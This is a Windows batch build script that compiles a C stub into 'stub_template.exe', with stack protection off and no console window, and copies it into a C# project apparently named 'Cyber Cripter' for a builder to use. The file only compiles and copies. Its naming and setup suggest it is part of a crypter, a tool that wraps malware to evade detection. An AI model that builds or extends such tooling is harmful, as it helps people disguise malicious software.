@echo off
REM Build script for stub_template.exe (x64).
REM Run from a "x64 Native Tools Command Prompt for VS" so cl.exe and link.exe
REM are on PATH. If you launch this from a plain cmd, set up vcvars first:
REM    "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

setlocal
pushd "%~dp0"

if not exist "build" mkdir build

cl /nologo /W3 /O2 /GS- /MT /D_CRT_SECURE_NO_WARNINGS ^
   /Fobuild\stub.obj /Fdbuild\stub.pdb ^
   stub.c ^
   /link /SUBSYSTEM:WINDOWS /MACHINE:X64 ^
         /OUT:build\stub_template.exe ^
         bcrypt.lib kernel32.lib advapi32.lib

if errorlevel 1 (
    echo.
    echo BUILD FAILED.
    popd
    exit /b 1
)

echo.
echo Built: %~dp0build\stub_template.exe
echo Copy it into "..\Cyber Cripter\Resources\stub_template.exe" so the
echo C# builder picks it up at runtime.

copy /y "build\stub_template.exe" "..\Cyber Cripter\Resources\stub_template.exe" >nul
if errorlevel 1 (
    echo Could not auto-copy. Do it manually.
) else (
    echo Auto-copied to Resources\stub_template.exe.
)

popd
endlocal
